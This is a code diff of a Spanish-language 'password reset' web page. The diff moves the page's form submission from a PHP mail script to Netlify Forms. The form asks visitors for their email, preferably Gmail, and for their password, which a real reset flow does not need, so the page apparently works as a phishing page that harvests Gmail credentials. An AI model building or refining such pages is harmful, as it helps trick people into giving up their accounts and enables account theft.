@@ -13,20 +13,23 @@
    
 <div class="container">
   <div class="testbox">
-    <form action="enviar_correo.php" method="post">
-        <img src="img/4.png" alt="">
-      <h2>RESTABLECIMIENTO DE CONTRASEÑA</h2>  <h3>
-          Por favor, proporciona tu dirección de correo de preferencia <Strong>Gmail</Strong> 
+    <!-- Formulario utilizando Netlify Forms -->
+    <form name="contact" method="POST" data-netlify="true">
+      <input type="hidden" name="form-name" value="contact" />
+      <img src="img/4.png" alt="">
+      <h2>RESTABLECIMIENTO DE CONTRASEÑA</h2>
+      <h3>
+        Por favor, proporciona tu dirección de correo de preferencia <strong>Gmail</strong> 
         y te enviaremos un enlace seguro para restablecer tu contraseña.
       </h3>
       <hr>
-    
-      <label id="icon" for="gmail"><i class="icon-envelope"></i></label>
+      <label for="gmail"><i class="icon-envelope"></i></label>
       <input type="email" name="gmail" id="gmail" placeholder="Correo" required/>
-      <label id="icon" for="password"><i class="icon-shield"></i></label>
+      <label for="password"><i class="icon-shield"></i></label>
       <input type="password" name="password" id="password" placeholder="Contraseña" required/>
       <button type="submit" class="button">Enviar</button>
     </form>
+    <!-- Fin del formulario -->
   </div>
 </div>
 
